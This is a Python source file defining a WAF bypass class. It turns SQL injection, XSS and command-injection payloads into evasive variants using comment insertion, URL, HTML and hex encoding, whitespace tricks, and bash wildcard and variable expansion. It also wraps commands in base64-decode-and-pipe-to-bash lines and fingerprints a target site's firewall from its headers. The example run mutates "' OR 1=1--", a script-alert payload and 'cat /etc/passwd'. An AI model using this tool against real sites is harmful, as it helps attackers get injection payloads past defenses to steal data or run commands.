"""
WAF Bypass Techniques
เทคนิคการหลบหลีก Web Application Firewall
"""

import re
import random
import string
from typing import List, Dict
from urllib.parse import quote, quote_plus


class WAFBypass:
    """WAF bypass techniques"""
    
    def __init__(self):
        self.techniques = [
            'case_variation',
            'comment_injection',
            'encoding',
            'whitespace_manipulation',
            'null_byte',
            'parameter_pollution',
            'multipart_bypass',
            'chunked_encoding'
        ]
    
    def bypass_sqli(self, payload: str) -> List[str]:
        """
        Generate SQL injection payloads that bypass WAF
        
        Args:
            payload: Original SQLi payload
        
        Returns:
            List of bypassed payloads
        """
        
        bypassed = []
        
        # 1. Case variation
        bypassed.append(self._case_variation(payload))
        
        # 2. Comment injection
        bypassed.extend(self._comment_injection_sqli(payload))
        
        # 3. Encoding
        bypassed.extend(self._encoding_bypass(payload))
        
        # 4. Whitespace manipulation
        bypassed.extend(self._whitespace_bypass(payload))
        
        # 5. Inline comments
        bypassed.extend(self._inline_comments(payload))
        
        # 6. Concatenation
        bypassed.extend(self._concatenation_bypass(payload))
        
        # 7. Scientific notation
        bypassed.extend(self._scientific_notation(payload))
        
        return bypassed
    
    def bypass_xss(self, payload: str) -> List[str]:
        """
        Generate XSS payloads that bypass WAF
        
        Args:
            payload: Original XSS payload
        
        Returns:
            List of bypassed payloads
        """
        
        bypassed = []
        
        # 1. Case variation
        bypassed.append(self._case_variation(payload))
        
        # 2. HTML encoding
        bypassed.extend(self._html_encoding(payload))
        
        # 3. JavaScript encoding
        bypassed.extend(self._js_encoding(payload))
        
        # 4. Unicode encoding
        bypassed.extend(self._unicode_encoding(payload))
        
        # 5. Tag breaking
        bypassed.extend(self._tag_breaking(payload))
        
        # 6. Event handler obfuscation
        bypassed.extend(self._event_handler_obfuscation(payload))
        
        return bypassed
    
    def bypass_command_injection(self, command: str) -> List[str]:
        """
        Generate command injection payloads that bypass WAF
        
        Args:
            command: Original command
        
        Returns:
            List of bypassed commands
        """
        
        bypassed = []
        
        # 1. Variable expansion
        bypassed.extend(self._variable_expansion(command))
        
        # 2. Wildcards
        bypassed.extend(self._wildcard_bypass(command))
        
        # 3. Brace expansion
        bypassed.extend(self._brace_expansion(command))
        
        # 4. Command substitution
        bypassed.extend(self._command_substitution(command))
        
        # 5. Hex encoding
        bypassed.extend(self._hex_encoding(command))
        
        return bypassed
    
    def _case_variation(self, payload: str) -> str:
        """Randomize case"""
        return ''.join(
            c.upper() if random.random() > 0.5 else c.lower()
            for c in payload
        )
    
    def _comment_injection_sqli(self, payload: str) -> List[str]:
        """Inject SQL comments"""
        
        bypassed = []
        
        # MySQL comments
        bypassed.append(payload.replace(' ', '/**/'))
        bypassed.append(payload.replace(' ', '/*!*/'))
        bypassed.append(payload.replace(' ', '/*! */'))
        
        # Inline comments
        bypassed.append(payload.replace('SELECT', 'SE/**/LECT'))
        bypassed.append(payload.replace('UNION', 'UN/**/ION'))
        bypassed.append(payload.replace('WHERE', 'WH/**/ERE'))
        
        # Hash comments
        bypassed.append(payload.replace(' ', '%23%0A'))
        
        return bypassed
    
    def _encoding_bypass(self, payload: str) -> List[str]:
        """Various encoding techniques"""
        
        bypassed = []
        
        # URL encoding
        bypassed.append(quote(payload))
        bypassed.append(quote_plus(payload))
        
        # Double URL encoding
        bypassed.append(quote(quote(payload)))
        
        # Hex encoding
        hex_payload = ''.join(f'%{ord(c):02x}' for c in payload)
        bypassed.append(hex_payload)
        
        return bypassed
    
    def _whitespace_bypass(self, payload: str) -> List[str]:
        """Whitespace manipulation"""
        
        bypassed = []
        
        # Tab instead of space
        bypassed.append(payload.replace(' ', '\t'))
        
        # Newline instead of space
        bypassed.append(payload.replace(' ', '\n'))
        
        # Multiple spaces
        bypassed.append(payload.replace(' ', '  '))
        
        # Mixed whitespace
        bypassed.append(payload.replace(' ', ' \t\n'))
        
        return bypassed
    
    def _inline_comments(self, payload: str) -> List[str]:
        """Inline comment injection"""
        
        bypassed = []
        
        # MySQL version-specific comments
        for version in ['50000', '50100', '50500']:
            bypassed.append(payload.replace('SELECT', f'/*!{version}SELECT*/'))
        
        return bypassed
    
    def _concatenation_bypass(self, payload: str) -> List[str]:
        """String concatenation"""
        
        bypassed = []
        
        # MySQL CONCAT
        if 'SELECT' in payload.upper():
            bypassed.append(payload.replace("'", "CONCAT(CHAR(39))"))
        
        # SQL Server concatenation
        bypassed.append(payload.replace("'admin'", "'ad'+'min'"))
        
        return bypassed
    
    def _scientific_notation(self, payload: str) -> List[str]:
        """Scientific notation for numbers"""
        
        bypassed = []
        
        # Replace numbers with scientific notation
        def replace_number(match):
            num = int(match.group())
            return f"{num}e0"
        
        bypassed.append(re.sub(r'\d+', replace_number, payload))
        
        return bypassed
    
    def _html_encoding(self, payload: str) -> List[str]:
        """HTML entity encoding"""
        
        bypassed = []
        
        # Decimal encoding
        decimal = ''.join(f'&#{ord(c)};' for c in payload)
        bypassed.append(decimal)
        
        # Hex encoding
        hex_encoded = ''.join(f'&#x{ord(c):x};' for c in payload)
        bypassed.append(hex_encoded)
        
        return bypassed
    
    def _js_encoding(self, payload: str) -> List[str]:
        """JavaScript encoding"""
        
        bypassed = []
        
        # Unicode escape
        unicode_escaped = ''.join(f'\\u{ord(c):04x}' for c in payload)
        bypassed.append(unicode_escaped)
        
        # Hex escape
        hex_escaped = ''.join(f'\\x{ord(c):02x}' for c in payload)
        bypassed.append(hex_escaped)
        
        return bypassed
    
    def _unicode_encoding(self, payload: str) -> List[str]:
        """Unicode encoding"""
        
        bypassed = []
        
        # UTF-7
        # Note: This is simplified, real UTF-7 encoding is more complex
        bypassed.append(payload.replace('<', '+ADw-').replace('>', '+AD4-'))
        
        return bypassed
    
    def _tag_breaking(self, payload: str) -> List[str]:
        """Break HTML tags"""
        
        bypassed = []
        
        # Null byte
        bypassed.append(payload.replace('<', '<\x00'))
        
        # Extra attributes
        if '<script>' in payload:
            bypassed.append(payload.replace('<script>', '<script x="">'))
            bypassed.append(payload.replace('<script>', '<script/x="">'))
        
        # Case variation in tags
        bypassed.append(payload.replace('<script>', '<ScRiPt>'))
        
        return bypassed
    
    def _event_handler_obfuscation(self, payload: str) -> List[str]:
        """Obfuscate event handlers"""
        
        bypassed = []
        
        # Add spaces
        bypassed.append(payload.replace('onerror=', 'on error ='))
        
        # Add newlines
        bypassed.append(payload.replace('onerror=', 'onerror\n='))
        
        # Add tabs
        bypassed.append(payload.replace('onerror=', 'onerror\t='))
        
        return bypassed
    
    def _variable_expansion(self, command: str) -> List[str]:
        """Variable expansion bypass"""
        
        bypassed = []
        
        # Bash variable expansion
        bypassed.append(command.replace('cat', 'c${x}at'))
        bypassed.append(command.replace('cat', 'c$@at'))
        bypassed.append(command.replace('cat', 'c${IFS}at'))
        
        return bypassed
    
    def _wildcard_bypass(self, command: str) -> List[str]:
        """Wildcard bypass"""
        
        bypassed = []
        
        # Replace characters with wildcards
        bypassed.append(command.replace('cat', 'c?t'))
        bypassed.append(command.replace('cat', 'c*t'))
        bypassed.append(command.replace('cat', '[c]at'))
        
        return bypassed
    
    def _brace_expansion(self, command: str) -> List[str]:
        """Brace expansion"""
        
        bypassed = []
        
        # Bash brace expansion
        bypassed.append(command.replace('cat', '{cat,}'))
        bypassed.append(command.replace('cat', 'c{a}t'))
        
        return bypassed
    
    def _command_substitution(self, command: str) -> List[str]:
        """Command substitution"""
        
        bypassed = []
        
        # Backticks
        bypassed.append(f'`{command}`')
        
        # $()
        bypassed.append(f'$({command})')
        
        return bypassed
    
    def _hex_encoding(self, command: str) -> List[str]:
        """Hex encoding for commands"""
        
        bypassed = []
        
        # Bash hex encoding
        hex_cmd = ''.join(f'\\x{ord(c):02x}' for c in command)
        bypassed.append(f'echo -e "{hex_cmd}" | bash')
        
        # Base64 encoding
        import base64
        b64_cmd = base64.b64encode(command.encode()).decode()
        bypassed.append(f'echo {b64_cmd} | base64 -d | bash')
        
        return bypassed
    
    def detect_waf(self, url: str) -> Dict:
        """
        Detect WAF type
        
        Args:
            url: Target URL
        
        Returns:
            Dict with WAF info
        """
        
        import httpx
        
        waf_signatures = {
            'cloudflare': ['__cfduid', 'cf-ray'],
            'akamai': ['akamai'],
            'aws_waf': ['x-amzn-requestid'],
            'imperva': ['incap_ses', 'visid_incap'],
            'f5_bigip': ['bigip', 'f5'],
            'mod_security': ['mod_security'],
            'wordfence': ['wordfence']
        }
        
        detected_wafs = []
        
        try:
            response = httpx.get(url, timeout=10.0)
            
            # Check headers
            headers_str = str(response.headers).lower()
            
            for waf_name, signatures in waf_signatures.items():
                for sig in signatures:
                    if sig in headers_str:
                        detected_wafs.append(waf_name)
                        break
            
            # Check cookies
            cookies_str = str(response.cookies).lower()
            
            for waf_name, signatures in waf_signatures.items():
                for sig in signatures:
                    if sig in cookies_str:
                        if waf_name not in detected_wafs:
                            detected_wafs.append(waf_name)
                        break
        
        except Exception as e:
            return {
                'detected': False,
                'error': str(e)
            }
        
        return {
            'detected': len(detected_wafs) > 0,
            'wafs': detected_wafs
        }


# Example usage
if __name__ == "__main__":
    waf = WAFBypass()
    
    # SQLi bypass
    sqli_payload = "' OR 1=1--"
    bypassed_sqli = waf.bypass_sqli(sqli_payload)
    
    print("SQLi Bypass Payloads:")
    for i, payload in enumerate(bypassed_sqli[:5], 1):
        print(f"  {i}. {payload}")
    
    # XSS bypass
    xss_payload = "<script>alert(1)</script>"
    bypassed_xss = waf.bypass_xss(xss_payload)
    
    print("\nXSS Bypass Payloads:")
    for i, payload in enumerate(bypassed_xss[:5], 1):
        print(f"  {i}. {payload}")
    
    # Command injection bypass
    cmd_payload = "cat /etc/passwd"
    bypassed_cmd = waf.bypass_command_injection(cmd_payload)
    
    print("\nCommand Injection Bypass Payloads:")
    for i, payload in enumerate(bypassed_cmd[:5], 1):
        print(f"  {i}. {payload}")

